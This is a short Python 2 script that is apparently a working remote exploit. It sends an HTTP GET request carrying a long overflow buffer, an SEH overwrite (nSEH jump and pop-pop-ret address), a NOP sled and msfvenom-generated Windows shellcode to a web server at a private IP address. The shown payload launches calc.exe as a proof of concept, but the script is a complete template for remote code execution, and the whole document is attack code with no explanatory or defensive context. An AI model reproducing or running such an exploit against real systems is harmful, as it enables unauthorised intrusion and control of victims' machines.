#!/usr/bin/python2

import socket
import sys

host = "192.168.67.137"
port = 80

# msfvenom -p windows/exec CMD=calc.exe  EXITFUNC=thread -b "\x00\x20\x25\x2b\x2f\x5c" -f c

shellcode = (
"\xda\xdc\xba\xc8\x55\x3c\x8d\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"
"\x31\x83\xee\xfc\x31\x56\x14\x03\x56\xdc\xb7\xc9\x71\x34\xb5"
"\x32\x8a\xc4\xda\xbb\x6f\xf5\xda\xd8\xe4\xa5\xea\xab\xa9\x49"
"\x80\xfe\x59\xda\xe4\xd6\x6e\x6b\x42\x01\x40\x6c\xff\x71\xc3"
"\xee\x02\xa6\x23\xcf\xcc\xbb\x22\x08\x30\x31\x76\xc1\x3e\xe4"
"\x67\x66\x0a\x35\x03\x34\x9a\x3d\xf0\x8c\x9d\x6c\xa7\x87\xc7"
"\xae\x49\x44\x7c\xe7\x51\x89\xb9\xb1\xea\x79\x35\x40\x3b\xb0"
"\xb6\xef\x02\x7d\x45\xf1\x43\xb9\xb6\x84\xbd\xba\x4b\x9f\x79"
"\xc1\x97\x2a\x9a\x61\x53\x8c\x46\x90\xb0\x4b\x0c\x9e\x7d\x1f"
"\x4a\x82\x80\xcc\xe0\xbe\x09\xf3\x26\x37\x49\xd0\xe2\x1c\x09"
"\x79\xb2\xf8\xfc\x86\xa4\xa3\xa1\x22\xae\x49\xb5\x5e\xed\x07"
"\x48\xec\x8b\x65\x4a\xee\x93\xd9\x23\xdf\x18\xb6\x34\xe0\xca"
"\xf3\xdb\x02\xdf\x09\x74\x9b\x8a\xb0\x19\x1c\x61\xf6\x27\x9f"
"\x80\x86\xd3\xbf\xe0\x83\x98\x07\x18\xf9\xb1\xed\x1e\xae\xb2"
"\x27\x7d\x31\x21\xab\xac\xd4\xc1\x4e\xb1"
)

nSEH = "\xeb\x10\x90\x90"
SEH = "\xbf\xa1\x01\x10"
nops_sled = "\x90" * 20

buffer = "A" * 4061
buffer += nSEH
buffer += SEH
buffer += nops_sled
buffer += shellcode

try:
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect((host,port))
	print "[+] Sending Payloads"
	s.send("GET " + buffer + " HTTP/1.0\r\n\r\n")
	print "[+] Done"
except:
	print "Host is Unreachable"
	sys.exit()
